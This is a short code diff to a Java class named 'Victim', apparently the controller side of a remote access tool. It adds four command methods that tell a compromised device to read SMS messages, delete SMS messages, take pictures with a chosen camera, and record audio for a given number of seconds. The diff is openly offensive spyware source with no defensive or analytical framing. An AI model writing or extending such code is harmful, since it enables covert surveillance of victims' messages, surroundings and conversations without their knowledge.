@@ -113,5 +113,38 @@ public class Victim {
         sendMessage(query);
     }
 
+    public void sendGetSms(String type, long count, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.sms");
+        query.put("type", type);
+        query.put("count", count);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendDeleteSms(long id, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "delete.sms");
+        query.put("id", id);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendTakePicture(String camera, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.picture");
+        query.put("camera", camera);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendStartAudioRecord(long seconds, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "start.audio.record");
+        query.put("seconds", seconds);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
 
 }
